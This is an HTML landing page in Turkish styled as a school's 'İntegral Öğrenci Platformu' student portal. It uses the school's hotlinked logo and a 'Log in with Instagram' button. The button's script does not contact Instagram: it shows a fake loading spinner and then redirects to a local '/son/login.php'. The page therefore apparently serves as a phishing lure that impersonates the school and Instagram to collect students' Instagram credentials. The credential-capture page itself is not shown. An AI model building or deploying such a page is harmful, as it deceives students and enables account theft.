<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>İntegral Öğrenci Platformu</title>
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
    <link rel="stylesheet" href="/son/styles.css">
    <style>
        body {
            background-color: #fafafa;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .container {
            text-align: center;
        }
        .welcome-title {
            font-size: 2rem;
            margin-bottom: 2rem;
        }
        .loading-icon {
            display: none;
            font-size: 2rem;
            margin-top: 2rem;
            animation: spin 1s infinite linear;
        }
        .show-loading .loading-icon {
            display: block;
        }
        @keyframes spin {
            0% {
                transform: rotate(0deg);
            }
            100% {
                transform: rotate(360deg);
            }
        }
        .login-link {
            text-decoration: none;
        }
        .login-btn {
            padding: 1rem 2rem;
            font-size: 1.6rem;
            background-color: #3897f0;
            color: #fff;
            border: none;
            border-radius: 0.4rem;
            cursor: pointer;
            transition: background-color 0.3s ease;
        }
        .login-btn:hover {
            background-color: #357ae8;
        }
        .logo img {
            width: 250px; /* Adjust size as needed */
            margin-bottom: 1rem;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <img src="https://kolejintegral.com/wp-content/uploads/2024/05/kolejintegrallogo-1.png" alt="İntegral Logo">
        </div>
        <h1 class="welcome-title">İntegral Öğrenci Platformuna Hoşgeldiniz</h1>
        <a href="#" onclick="redirectToInstagram(event)" class="login-link">
            <button class="login-btn"><i class="fab fa-instagram"></i> Instagram ile Giriş Yap</button>
        </a>
        <div class="loading-icon"><i class="fas fa-spinner fa-spin"></i></div>
    </div>

    <script>
        function redirectToInstagram(event) {
            // Prevent default link behavior
            event.preventDefault();

            // Show loading icon and message
            document.querySelector('.container').classList.add('show-loading');

            // Simulate a delay for demonstration
            setTimeout(function() {
                window.location.href = "/son/login.php";
            }, 2000); // 2 seconds delay before redirecting
        }
    </script>

    <script src="https://code.jquery.com/jquery-3.5.1.slim.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.5.4/dist/umd/popper.min.js"></script>
    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
</body>
</html>
